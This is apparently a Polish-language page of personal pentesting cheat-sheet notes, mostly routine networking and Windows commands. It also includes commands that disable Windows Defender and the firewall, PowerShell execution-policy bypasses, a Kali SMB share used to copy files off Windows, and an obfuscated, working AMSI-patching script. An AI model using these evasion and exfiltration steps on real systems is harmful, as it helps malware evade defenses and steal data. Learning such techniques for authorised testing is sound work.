---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# !

Czy jest połączenie między kompami/netem

```
ping 10.20.10.4
ping cyber.local
ping wp.pl
```

jaką trasę przebywa komputer do danej strony

```
sudo hping3 --traceroute wp.pl -v -1
```

Jakie polityki spływają na komputer

```
gpresult /r
```

Siłowy update polityk

```
gpupdate /force
```

wystawienie katalogu w Kali na zewnątrz

```
python -m http.server 
sudo impacket-smbserver -smb2support share /home/kali/Desktop
```

na Windows podłaczenie się do SMB wystawionego przez Kali

```
net use x: \\10.20.10.31\share
```

kopiowanie jak jesteśmy w tym folderze w którym jest ten plik który chcemy skopiować z Windowsa na Kaliego

```
Copy-Item .\plik.zip X:
```

sprawdzanie aktywnych połączeń Kali/Win

```
sudo netstat -tulpn
netstat -ano
```

wyłączanie Defendera/Firewalla w Windows

```
netsh advfirewall set allprofiles state off

Set-MpPreference -DisableRealtimeMonitoring 1
Set-NetConnectionProfile -InterfaceName eth0 -NetworkCategory Private

Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

WYLACZENIE ZABEZPEICZEN DLA PROCESU

```
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

WYLACZENIE ZABEZPEICZEN DLA UZYTKOWNIKA

```
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
```

sprawdzenie źródła ostatniego eventu

{% code overflow="wrap" %}
```
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" | Where-Object { $_.LevelDisplayName -ne "Information" } | Select-Object -ExpandProperty Message
```
{% endcode %}

WYLACZENIE AMSI

{% code overflow="wrap" fullWidth="false" %}
```
$qycku = @"
using System;
using System.Runtime.InteropServices;
public class qycku {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr segajv, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $qycku

$sykxfjb = [qycku]::LoadLibrary("$([CHAR]([BytE]0x61)+[ChAR]([ByTe]0x6d)+[CHAR]([bYtE]0x73)+[CHaR]([byte]0x69)+[CHar]([bYTe]0x2e)+[CHAr](100)+[CHAr](108*41/41)+[chaR](108+38-38))")
$rzseld = [qycku]::GetProcAddress($sykxfjb, "$([cHaR](65)+[cHar]([bYtE]0x6d)+[cHaR]([BYtE]0x73)+[chAr](105+55-55)+[CHAR]([bYTE]0x53)+[ChAr]([ByTE]0x63)+[ChAr](97*88/88)+[cHAR]([BYtE]0x6e)+[cHAr](66*64/64)+[chAr](117+96-96)+[CHar](102+67-67)+[chaR]([bYTE]0x66)+[CHar](101+34-34)+[ChAr](114))")
$p = 0
[qycku]::VirtualProtect($rzseld, [uint32]5, 0x40, [ref]$p)
$pmeg = "0xB8"
$yhay = "0x57"
$ushj = "0x00"
$kdtz = "0x07"
$mrob = "0x80"
$fhad = "0xC3"
$fuqdn = [Byte[]] ($pmeg,$yhay,$ushj,$kdtz,+$mrob,+$fhad)
[System.Runtime.InteropServices.Marshal]::Copy($fuqdn, 0, $rzseld, 6)
```
{% endcode %}

updatowanie bazy searchsploit

```
searchsploit -u
```

ściąganie skryptu

```
searchsploit -m <path>
```

podgląd skryptu

```
searchsploit -x
```

FTP

```
ftp 172.2.12.99

get index.html
put plik.txt
dir
```

{% hint style="info" %}
jeżeli napiszemy jakiś skrypt w php to serwer http (Apache) to wykona
{% endhint %}

różnice w plikach

```
vimdiff plik1 plik2
```

listowanie ticketów kerberosowych

```
klist
```

usuwanie ticketów

```
klist purge
```

kasowanie zapisanych dns w Win

```
ipconfig /flushdns
```

podgląd wpisów w dns

```
ipconfig /displaydns
```

sprawdzanie ip google.com

```
nslookup google.com
```

sprawdzanie adaptera sieci

```
iwconfig
```

łączenie się poprzez openvpn

```
sudo openvpn plik.ovpn
```



<div data-full-width="true">

<figure><img src=".gitbook/assets/Screenshot 2023-07-24 at 18.59.00.png" alt=""><figcaption></figcaption></figure>

</div>
